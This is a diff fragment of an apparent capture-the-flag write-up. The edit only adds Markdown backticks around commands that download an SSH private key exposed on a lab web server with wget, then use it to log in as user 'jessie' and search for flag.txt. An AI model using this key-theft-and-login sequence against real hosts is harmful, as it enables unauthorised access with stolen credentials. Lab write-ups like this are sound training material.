@@ -51,15 +51,15 @@ http://10.113.186.73/sitemap/.ssh/id_rsa
 
 <img width="507" height="434" alt="image" src="https://github.com/user-attachments/assets/b845453a-d29f-4f6e-99cf-9c20b25e5aad" />
 
-wget http://10.113.186.73/sitemap/.ssh/id_rsa
+`wget http://10.113.186.73/sitemap/.ssh/id_rsa`
 
-chmod 600 id_rsa
+`chmod 600 id_rsa`
 
-sudo ssh -i ~/.ssh/id_rsa jessie@10.113.186.73
+`sudo ssh -i ~/.ssh/id_rsa jessie@10.113.186.73`
 
 <img width="717" height="264" alt="image" src="https://github.com/user-attachments/assets/3630da6b-0805-4e20-bab2-326e6d47b1af" />
 
-find ~/ flag.txt
+`find ~/ flag.txt`
 
 <img width="433" height="134" alt="image" src="https://github.com/user-attachments/assets/caff6dcb-b5eb-480e-a8b1-2ba89492937d" />
 
